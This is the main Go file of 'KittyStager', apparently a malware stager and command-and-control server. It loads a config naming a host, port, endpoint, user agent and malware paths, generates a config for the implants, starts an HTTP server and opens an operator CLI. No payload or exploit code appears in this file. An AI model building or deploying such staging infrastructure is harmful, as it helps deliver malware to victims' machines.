/*
Copyright © 2022 Enelg
*/
package main

import (
	"GoStager/cli"
	"GoStager/config"
	"GoStager/http"
	"GoStager/util"
	"errors"
	"fmt"
	color "github.com/logrusorgru/aurora"
)

func main() {
	fmt.Println(color.Cyan("                     _\n                    / )\n                   ( (\n     A.-.A  .-\"\"-.  ) )\n    / , , \\/      \\/ /\n   =\\  t  ;=    /   /\n     `--,'  .\"\"|   /\n         || |  \\\\ \\\n        ((,_|  ((,_\\\n"))
	fmt.Println(color.Cyan("KittyStager - A simple stager written in Go\n"))
	conf, err := config.GetConfig()
	if err != nil {
		util.ErrPrint(err)
	}
	//check config
	if conf.Conf.Host == "" || conf.Conf.Port == 0 || conf.Conf.EndPoint == "" || conf.Conf.UserAgent == "" || conf.Conf.MalPath == nil {
		util.ErrPrint(errors.New("please check your config file"))
		return
	}
	fmt.Println(color.Green("[+] Config loaded"))
	//generate config file for the malwares
	err = util.GenerateConfig(conf)
	if err != nil {
		util.ErrPrint(errors.New("error while generating config file"))
		return
	}
	fmt.Println(color.Green("[+] Config file generated"))
	fmt.Println(color.Green("[+] Starting http server"))
	fmt.Printf("%s %d%s %s %s\n", color.Green("[+] Sleep set to"), color.Yellow(conf.Conf.Sleep), color.Yellow("s"), color.Green("on"), color.Yellow("all targets"))
	go http.CreateHttpServer(conf)
	err = cli.Cli(conf)
	if err != nil {
		util.ErrPrint(err)
	}
}
